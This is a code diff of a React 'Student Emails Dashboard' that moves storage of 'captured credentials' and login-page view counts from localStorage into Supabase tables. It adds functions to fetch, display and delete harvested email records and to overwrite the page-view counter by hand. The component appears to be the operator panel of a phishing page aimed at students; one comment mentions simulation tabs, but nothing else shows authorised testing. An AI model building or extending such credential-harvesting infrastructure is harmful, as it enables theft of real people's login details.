@@ -1,24 +1,40 @@
 import React, { useState, useEffect } from 'react';
 import { Link } from 'react-router-dom';
+import { supabase } from "./supabaseClient"; // Add this import at the top
 
 export default function Counter() {
   const [records, setRecords] = useState([]);
   const [pageViews, setPageViews] = useState(0);
 
-  const updateDashboard = () => {
-    const storedData = localStorage.getItem('captured_emails');
-    const parsedRecords = storedData ? JSON.parse(storedData) : [];
-    const cleanedRecords = parsedRecords.map(record => {
+  // Inside your Counter component, replace updateDashboard with a live pull:
+const updateDashboard = async () => {
+  // Fetch captured credentials
+  const { data: emailData } = await supabase
+    .from('captured_data')
+    .select('*')
+    .order('id', { ascending: false });
+
+  if (emailData) {
+    const cleanedRecords = emailData.map(record => {
       if (record.savedAt && record.savedAt.includes(',')) {
         return { ...record, savedAt: record.savedAt.split(',')[0] };
       }
       return record;
     });
     setRecords(cleanedRecords);
+  }
 
-    const views = parseInt(localStorage.getItem('login_views')) || 0;
-    setPageViews(views);
-  };
+  // Fetch the uniform global view count
+  const { data: viewData } = await supabase
+    .from('analytics')
+    .select('view_count')
+    .eq('id', 1)
+    .single();
+
+  if (viewData) {
+    setPageViews(viewData.view_count);
+  }
+};
 
   useEffect(() => {
     document.title = "Student Emails Dashboard";
@@ -29,14 +45,21 @@ export default function Counter() {
     };
   }, []);
 
-  const handleEditViews = () => {
-    const newCount = window.prompt("Modify total login page open metrics:", pageViews);
-    if (newCount === null || newCount.trim() === "" || isNaN(newCount)) return;
-    
-    localStorage.setItem('login_views', parseInt(newCount));
-    setPageViews(parseInt(newCount));
-    window.dispatchEvent(new Event('storage'));
-  };
+  const handleEditViews = async () => {
+  const newCount = window.prompt("Modify total login page open metrics:", pageViews);
+  if (newCount === null || newCount.trim() === "" || isNaN(newCount)) return;
+  
+  const targetInt = parseInt(newCount);
+
+  const { error } = await supabase
+    .from('analytics')
+    .update({ view_count: targetInt })
+    .eq('id', 1);
+
+  if (!error) {
+    setPageViews(targetInt);
+  }
+};
 
   const handleEditDate = (indexToEdit, e) => {
     // Prevent clicking the cell from triggering if they clicked the delete button
@@ -56,19 +79,17 @@ export default function Counter() {
   };
 
   // NEW FEATURE: Removes a single targeted email row from localStorage
-  const handleDeleteRow = (indexToDelete, emailAddress, e) => {
-    e.stopPropagation(); // Stops the row edit prompt from popping up
-    
-    if (window.confirm(`Are you sure you want to completely remove ${emailAddress} from the log?`)) {
-      const updatedDataset = records.filter((_, index) => index !== indexToDelete);
-      
-      setRecords(updatedDataset);
-      localStorage.setItem('captured_emails', JSON.stringify(updatedDataset));
-      
-      // Sync change instantly across any other open simulation tabs
-      window.dispatchEvent(new Event('storage'));
-    }
-  };
+  const handleDeleteRow = async (id, emailAddress, e) => {
+  e.stopPropagation();
+  if (window.confirm(`Delete ${emailAddress}?`)) {
+    const { error } = await supabase
+      .from('captured_data')
+      .delete()
+      .eq('id', id); // Deletes row with matching unique ID
+
+    if (!error) updateDashboard(); // Refresh UI layout
+  }
+};
 
   const visibleRecords = records.slice(0, 250);
 
